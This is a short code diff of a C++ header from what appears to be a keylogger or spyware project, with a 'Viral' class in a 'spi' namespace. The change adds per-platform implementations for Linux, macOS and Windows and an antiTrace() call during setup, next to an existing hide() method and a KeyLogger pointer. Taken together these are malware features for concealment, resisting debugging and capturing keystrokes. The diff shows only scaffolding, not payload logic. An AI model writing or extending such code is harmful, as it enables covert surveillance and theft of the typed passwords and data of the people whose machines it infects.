@@ -14,18 +14,26 @@
 #include <KeyLogger/KeyLogger.hpp>
 #include "Configuration.hpp"
 
-#define LOG_VIRAL "{'Viral'}"
+#if defined(USING_LINUX)
+#include <Viral/details/LinuxViral.hpp>
+#elif defined(USING_OSX)
+#include <Viral/details/OSXViral.hpp>
+#elif defined(USING_WINDOWS)
+#include <Viral/details/WindowsViral.hpp>
+#else
+#error Unsupported platform
+#endif
 
 namespace spi
 {
-    class Viral
+    class Viral : details::ViralImpl
     {
     public:
         Viral() = default;
 
-        ~Viral() noexcept
+        virtual ~Viral() noexcept
         {
-          _log(logging::Info) << LOG_VIRAL << " shutting down." << std::endl;
+            _log(logging::Info) << " shutting down." << std::endl;
         }
 
         void hide() const noexcept
@@ -40,12 +48,13 @@ namespace spi
 
         void setup(KeyLogger *keylogger) noexcept
         {
+            antiTrace();
             _keylogger = keylogger;
-            _log(logging::Info) << LOG_VIRAL << " Successfully initialized" << std::endl;
+            _log(logging::Info) << " Successfully initialized" << std::endl;
         }
 
     private:
-      logging::Logger _log{"spider-viral", logging::Level::Debug};
+        logging::Logger _log{"spider-viral", logging::Level::Debug};
         KeyLogger *_keylogger{nullptr};
     };
 }
